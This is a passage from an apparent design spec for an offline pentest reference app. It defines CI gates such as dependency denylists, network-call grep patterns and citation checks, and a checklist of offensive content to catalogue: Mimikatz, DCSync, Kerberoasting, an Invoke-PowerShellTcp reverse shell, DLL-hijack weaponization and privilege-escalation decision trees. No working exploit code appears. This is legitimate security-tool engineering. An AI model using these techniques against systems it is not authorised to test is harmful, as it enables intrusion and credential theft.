enforces that EVERY unverified record carries `references[]` + surfaces `[UNVERIFIED]` — the citation
discipline, not the underlying fact. Author honestly.

---

## 9. NEW CI GATES (wire into `scripts/gates.ts` + `scripts/ci.ts` + `.github/workflows/ci.yml`)

Existing Gates 1–14 untouched. Add:

- **G15 cve-antifab** — every `CveExploitEntry`: `references[]` resolve to a real `Reference` with a real
  url; `cveId` matches `/^CVE-\d{4}-\d{4,}$/`; `edbId` positive int; `searchsploitTerm` non-empty; no
  routable IP (reuse `gate-routable-ip`/`isAllowedIp`); `any`/out-of-DB EDB ⇒ `confidence:'unverified'`.
- **G16 no-ai-deps** — scan `package.json` + lockfile against denylist: `openai`, `@anthropic-ai/*`,
  `@huggingface/*`, `@xenova/transformers`, `onnxruntime*`, `@tensorflow/*`, `langchain`, `llamaindex`,
  `cohere-ai`, `replicate`, `brain.js`, `ml-*`, AND `axios`, `node-fetch`, `got`, `superagent`, `ws`,
  `socket.io-client`, `firebase`, `@supabase/*`, `@sentry/*`, `posthog-js`, `mixpanel`, `analytics`.
  (MiniSearch/zustand/@xyflow/workbox allowlisted.)
- **G17 no-runtime-net** — grep `src/**` + `dist/assets/**` for `fetch(`, `XMLHttpRequest`,
  `new WebSocket`, `navigator.sendBeacon`, `EventSource`, `RTCPeerConnection`, `importScripts(http`,
  `navigator.gpu`; assert workbox `runtimeCaching` has no third-party origin.
- **G18 csp** — shipped `index.html` carries strict CSP:
  `default-src 'self'; connect-src 'none'; script-src 'self'; object-src 'none'; base-uri 'none'`.
- **G19 playwright-no-net** — built app under Playwright `route('**')` interception; FAIL on any
  non-localhost request during a scripted tour (boot/search/ask/advisor/cve/mindmap/paste-scan/copy).
- **G20 unverified-citation** (anti-fabrication beyond CVE) — for EVERY shipped record across ALL v2
  datasets — `Command` (incl. every `PS-*` arsenal leaf), `PrivilegeSignal`, `PrivilegeRule`,
  `DecisionNode`, `ToolBinary`, `CveExploitEntry` — whose `confidence==='unverified'` (or
  `DecisionNode.unverified===true`): assert non-empty `references[]` (each resolving to a real
  `Reference` with a real url) AND that the rendered label/title/notes surfaces the literal `[UNVERIFIED]`
  token. This is `advisor-coverage`'s "unverified ⇒ reason+refs" rule generalized to ALL Command rows and
  decision nodes, not just rules. **NAME existence (a PowerView/PowerUp function, a flag, a CLSID, a
  build threshold) cannot be machine-verified — G20 enforces the CITATION discipline, not the fact.**
  Optional lint: any command template referencing a fork-divergent name (`Get-Net*` vs `Get-Domain*`)
  MUST be flagged `confidence:'unverified'`.
- **G21 no-ambient-clock** — cheap grep over `src/engine/**` + `src/store/**` DENYING `Date.now`,
  `new Date(`, `Math.random`, `performance.now`, `crypto.getRandomValues`. Clocks/ids arrive ONLY via an
  injected `now()` parameter. Makes the no-ambient-clock / no-random invariant CI-enforced rather than
  only snapshot-implied. (Cosmetic `parsedAt`/`generatedAt` come from injected `now()` and are excluded
  from test equality.)
- **ps-shell** — assert `shell==='powershell'` for every arsenal `Command` whose leaf id is in the
  `PS-*` namespace (or whose parent declares `shell:'powershell'`). The documented `cmd` transfer
  variants (`certutil`, `bitsadmin`, authored under non-`PS-*` ids) are an EXPLICIT ALLOWLIST carve-out
  matched by id — NOT a wildcard loosening. The gate FAILS if any `PS-*` leaf is non-powershell, OR if a
  `cmd` row appears outside the named allowlist.
- **tool-provenance** — every `ToolBinary` has `officialRef` + literal `fetchNote`; NO `binaryUrl`; no
  committed binary blob.
- **advisor-coverage** — every signal → ≥1 rule; every `rule.commandId` compiles via `TemplateEngine`;
  unverified rules carry reason + refs (subsumed/extended by G20 across all record kinds).
- **intent-resolves** — every alias/phrase target id exists in content.
- **decision-reachability** — `rootNodeId` resolves; every edge `source`/`target`/`commandId`/
  `techniqueId`/`signalId`/`refId`/`toolBinaryId` FK resolves; every check node has a check; every
  non-`else` edge's `signalId` exists in source node `observes`; every non-outcome node has ≥1 outgoing
  incl. fallback; ≥1 outcome terminal; no orphan nodes; unverified nodes have refs.
- **nmap-route-coverage** — every `coverage.manifest` `nmap-routes` port has a `ServiceRoute` whose
  `techniqueIds` resolve to real Techniques; fixtures use only RFC5737 IPs + synthetic domains
  (no-machine-names + routable-IP gates green).
- **token-KEY parity (EXTENDED)** — union `TOKEN_KEYS ∪ TOKEN_KEYS_V2`; no stray `--cph-*`.
- **determinism** (folds into `pnpm test`) — golden snapshot tests for `resolveIntent()` (incl. the REAL
  `SearchEngine` seam test of §6.1), `lookupCve()`, `parseEnumOutput()`, `walkDecision()`,
  `NmapParser`/`route()` over fixture inputs → frozen ordered-id JSON; any random/Date/network breaks the
  snapshot (and G21 trips independently at grep time).

Add the gate names (G15–G21 + ps-shell, tool-provenance, advisor-coverage, intent-resolves,
decision-reachability, nmap-route-coverage, extended token-KEY parity, determinism) to the CC-11 list.
CC-12 stays enforced (meaning never hue-only).

---

## 10. LOOP.md MASTER CHECKLIST — NEW ADDITIVE BLOCKS

Append to `_prompts/LOOP.md` (same `☐`/`☑` discipline; `☑` only when the leaf is content-complete AND its
gate is green).

```
◆ PS — POWERSHELL & Invoke-* ARSENAL (F1; content only)
☐ PS-1  PowerView slice: Get-Domain/User/Group/Computer/GPO, Get-DomainObjectAcl, Find-LocalAdminAccess,
        Find-DomainShare, Find-DomainUserLocation, Get-DomainSPNTicket, Set-DomainObject, Add-DomainGroupMember,
        Set-DomainObjectOwner/Add-DomainObjectAcl — legacy+modern names, [UNVERIFIED] on fork-divergent ones
☐ PS-2  PowerUp slice: Invoke-AllChecks, Get-ServiceUnquoted, Get-ModifiableService(File), Invoke-ServiceAbuse,
        Write-ServiceBinary, Write-HijackDll, Get-UnattendedInstallFile, Get-RegistryAlwaysInstallElevated,
        Get-ApplicationHost, autorun/autologon
☐ PS-3  Invoke-* family: Kerberoast, ASREPRoast, Mimikatz variants, DCSync (own Command), RunAs, Command,
        IEX/Expression, WebRequest transfer (+certutil/bitsadmin cmd variants — non-PS-* ids, ps-shell allowlist)
☐ PS-4  Nishang slice: Invoke-PowerShellTcp, Copy-VSS, Out-Minidump, Invoke-PortScan, Get-Information
☐ PS-5  DLL-hijack weaponization Technique (detect→generate→plant→trigger), methodology-level, Write-HijackDll only
        ☑ each PS-* leaf: shell:'powershell' + {{TOKENS}} + precondition + severity + refs/[UNVERIFIED]
        + indexed in MiniSearch + wired to ≥1 DecisionMap + ≥1 PrivilegeRule + a ToolBinary

◆ TOOL — PROVENANCE (F2)
☐ TOOL-1 GhostPack: Rubeus, Certify, Seatbelt (compile/SharpCollection note)
☐ TOOL-2 ADCS/AD: Certipy, SharpHound+BloodHound, Impacket, NetExec(nxc), Responder
☐ TOOL-3 Win privesc: winPEAS/linPEAS, PrintSpoofer, GodPotato, JuicyPotato(+NG)/RoguePotato/SweetPotato, accesschk, PsExec, RunasCs
☐ TOOL-4 Creds/PS/pivot: mimikatz, PowerSploit(PowerView/PowerUp), Nishang, Chisel, ligolo-ng
        ☑ each: officialRef(+releaseRef?)=Reference, shipsOnKali/kaliPath, literal fetchNote, NO binaryUrl, no committed blob

◆ ADV — PRIVILEGE ADVISOR (F3)
☐ ADV-1 Win token-priv signals+rules (SeImpersonate build-gated, SeAssignPrimaryToken, SeBackup, SeRestore[UNV],
        SeTakeOwnership[UNV], SeDebug, SeLoadDriver[UNV], SeManageVolume[UNV], SeTcb/SeCreateToken[UNV])
☐ ADV-2 Win groups (SID-first): Backup/Server/Print/Account Operators, DnsAdmins[UNV], GPO-creators, Remote-Mgmt
☐ ADV-3 Linux sudo: ALL, GTFOBins-per-basename, LD_PRELOAD, Baron-Samedit→F6
☐ ADV-4 Linux suid/cap/group/file: GTFOBins-suid(pkexec→PwnKit[UNV]), cap_setuid/dac_read/sys_admin[UNV]/sys_ptrace[UNV],
        docker/lxd/disk/shadow/adm, writable passwd/shadow, kernel→F6
☐ ADV-5 parser: ANSI-strip, block-sniff per source, token-priv fires enabled|disabled, SID-first groups, unrecognizedLines passthrough
        ☑ every signal→≥1 rule→compiling commandId (TemplateEngine)+toolBinaryId+confidence; [UNVERIFIED] carries reason+refs (G20)

◆ ASK — ASK-THE-OCTOPUS (F4)
☐ ASK-1 IntentAlias coverage for every core technique (synonyms/abbrevs)
☐ ASK-2 PhrasebookEntry coverage incl. powershell + AD bridges + advisor-signal phrasings ("what can I do with SeImpersonate")
☐ ASK-3 stoplist keeps load-bearing short tokens (ad/sam/spn/smb/rce/suid/db/ca); table-driven stemmer
☐ ASK-4 resolve pipeline + explain-why chip; OctoState wiring; golden snapshot (query→ordered ids); REAL-SearchEngine seam test
        ☑ every alias/phrase target id resolves to a LIVE content id

◆ DEC — DECISION TREES (F5/F7)
☐ DEC-1 dec.win.tokenpriv (potato-by-build / hive / service-misconfig / Backup Operators)
☐ DEC-2 dec.linux.privesc (sudo/getcap/suid/kernel/group/NFS branches)
☐ DEC-3 dec.ad.nocreds-to-da (poison/coerce → creds/BloodHound/Kerberoast/ACL/ADCS/delegation → local-admin → DCSync/DA)
☐ DEC-4 ADCS ESC1–8 verified, ESC9/10 cited, ESC11/12/13 [UNVERIFIED]; delegation unconstrained/constrained/RBCD S4U; ACL-abuse→command table
        ☑ each node: check-command + observe + ≥2 branch edges incl fallback; signalRef reuses F3 signals; unverified nodes have refs+[UNVERIFIED] (G20); decision-reachability green

◆ CVE — CVE/VERSION LOOKUP (F6)
☐ CVE-1 curated CveExploitEntry per common exam service/version (vsftpd/ProFTPD/Apache/Samba/OpenSMTPD/Shellshock/Drupalgeddon2/Webmin/PwnKit)
☐ CVE-2 version matcher + searchsploit escape hatch; uncertain ⇒ [UNVERIFIED]
        ☑ each entry cited (NVD+EDB Reference) or [UNVERIFIED]; searchsploitTerm exact; no invented ids; cve-antifab green

◆ NMAP — TRIAGE / SCAN ROUTER (F8)
☐ NMAP-1 parser: human + -oG + -oX, multi-host, ANSI/noise-tolerant, dep-free XML, injected clock (no Date.now — G21)
☐ NMAP-2 routing table: full common-port catalog → real technique ids (port+service+product regex)
☐ NMAP-3 realm inference: AD-gated, category-deduped; Samba override; confidence rule
☐ NMAP-4 autofill: RHOST/TARGET/DOMAIN; NEVER overwrite user-set (conflict gate)
☐ NMAP-5 CVE handoff → F6 (curated, [UNVERIFIED] on loose; no network/auto-run)
☐ NMAP-6 explainability: every firing carries matchedOn+matchedText; explain() string
☐ NMAP-7 Ask-the-Octopus 'Paste scan' mode + NmapTriageBoard (sev/node/var tokens)
☐ NMAP-8 golden fixtures + unit tests (linux/windows/AD-DC/multi-host); gates green
```

### `coverage.manifest.yaml` — additive `v2` block + `nmap-routes` block

```yaml
v2:
  arsenal:  [tool.rubeus, tool.powerview, tool.powerup, tool.printspoofer, tool.godpotato,
             tool.certipy, tool.netexec, tool.mimikatz, tool.nishang, tool.impacket]
  signals:  [sig.win.seimpersonate, sig.win.sebackup, sig.win.sedebug, sig.win.seloaddriver,
             sig.win.semanagevolume, sig.win.backupoperators, sig.win.serveroperators,
             sig.linux.sudo_nopasswd, sig.linux.cap_setuid, sig.linux.docker]
  decisions: [dec.win.tokenpriv, dec.linux.privesc, dec.ad.nocreds-to-da]
  cve:      [cve.proftpd.135.modcopy, cve.vsftpd.234.backdoor, cve.apache.2449.traversal,
             cve.linux.pwnkit, cve.shellshock]
nmap-routes:   # gate fails if a catalog port has no route
  - { id: nmap.route.ftp,      port: 21,   band: high }
  - { id: nmap.route.ssh,      port: 22,   band: high }
  - { id: nmap.route.smb,      port: 445,  band: core }
  - { id: nmap.route.ldap,     port: 389,  band: core }
  - { id: nmap.route.kerberos, port: 88,   band: core }
  - { id: nmap.route.winrm,    port: 5985, band: high }
  - { id: nmap.route.rdp,      port: 3389, band: medium }
  - { id: nmap.route.mssql,    port: 1433, band: high }
  - { id: nmap.route.web,      port: 80,   band: high }
  # …one entry per seed ServiceRoute so the full common-port catalog is auditable as covered
```

Extend existing technique-band rows with PS arsenal ids (`ps.powerview.*`, `ps.powerup.*`,
`ps.invoke.*`) so the running loop counts coverage. The self-driving loop drives every `☐` to `☑` via
these new `coverage.manifest` IDs + the new gates.

---

## 11. BUILD ORDER + DEFINITION OF DONE

**Build order** (each step ends green before the next): (1) write the 7 new type modules §3 + tokens.v2
§4 + Zod parity §7 — `tsc --noEmit` + `schema-parity.v2.test.ts` green, frozen
`schema-parity.test.ts` byte-identical; (2) write the pure engines §6 with their golden snapshot tests +
the REAL-`SearchEngine` seam test (§6.1) — `pnpm test` green, G21 grep clean; (3) author content §8
(F1 → F2 → F3 → F6 → F4 → F5/F7 → F8) into JSON datasets, `scripts/build-v2.ts` emits + validates the
`CephaloV2Bundle`; (4) build the routes/components §5 wired props-in/events-out; (5) add
`ResponsibleUseNote` banner + per-feature chips §0.2; (6) wire the new gates §9 into
`gates.ts`/`ci.ts`/`ci.yml`; (7) append LOOP blocks + coverage.manifest §10 and let the loop drive
`☐ → ☑`.

**Definition of DONE** (all true): frozen modules byte-identical; ZERO new fields on any frozen
interface; F4 intent calls `SearchEngine.search({ query })` (object, not string) and a test binds the
REAL frozen engine; every engine pure + deterministic (golden snapshots stable across two runs, G21 grep
clean); no `Math.random` / ambient clock / network / NLP-ML dep anywhere; every `ToolBinary` link-only
with literal `fetchNote` and no `binaryUrl`/committed blob; every uncertain leaf (Command / Signal / Rule
/ DecisionNode / ToolBinary / CVE) `[UNVERIFIED]` + refs (G20); defanged placeholders only; no machine
names; persistent NO-AI/offline banner on every route + per-feature explain-why chips; G15–G21 + ps-shell
(scoped to `PS-*`, cmd allowlist) + tool-provenance + advisor-coverage + intent-resolves +
decision-reachability + nmap-route-coverage + extended token-KEY parity + determinism all green; every new
`coverage.manifest` id maps to live content; every LOOP `☐` driven to `☑`.